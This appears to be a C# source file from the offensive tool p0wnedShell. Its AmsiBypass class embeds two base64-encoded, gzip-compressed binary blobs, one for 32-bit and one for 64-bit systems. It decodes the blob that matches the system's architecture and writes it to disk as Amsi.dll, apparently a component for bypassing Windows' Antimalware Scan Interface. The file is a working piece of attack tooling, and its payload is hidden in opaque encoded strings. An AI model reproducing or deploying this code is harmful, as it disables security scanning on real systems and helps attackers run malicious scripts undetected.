using System;
using System.IO;
using System.IO.Compression;


namespace p0wnedShell
{
    class AmsiBypass
    {
        public static byte[] Decompress(byte[] data)
        {
            using (var compressedStream = new MemoryStream(data))
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            using (var resultStream = new MemoryStream())
            {
                var buffer = new byte[4096];
                int read;

                while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    resultStream.Write(buffer, 0, read);
                }

                return resultStream.ToArray();
            }
        }

        public static byte[] Base64_Decode(string encodedData)
        {
            byte[] encodedDataAsBytes = Convert.FromBase64String(encodedData);
            return encodedDataAsBytes;
        }

        public static void Amsi(string arch)
        {
            BinaryWriter bw;

            string AmsiX86 = "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";
            string AmsiX64 = "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";

            bw = new BinaryWriter(new FileStream(Program.P0wnedPath() + "\\Amsi.dll", FileMode.Create));
            if (arch == "AMD64")
            {
                byte[] decoded = Base64_Decode(AmsiX64);
                byte[] decompressed = Decompress(decoded);
                bw.Write(decompressed);
            }
            else {
                byte[] decoded = Base64_Decode(AmsiX86);
                byte[] decompressed = Decompress(decoded);
                bw.Write(decompressed);
            }
            bw.Close();
        }
    }
}
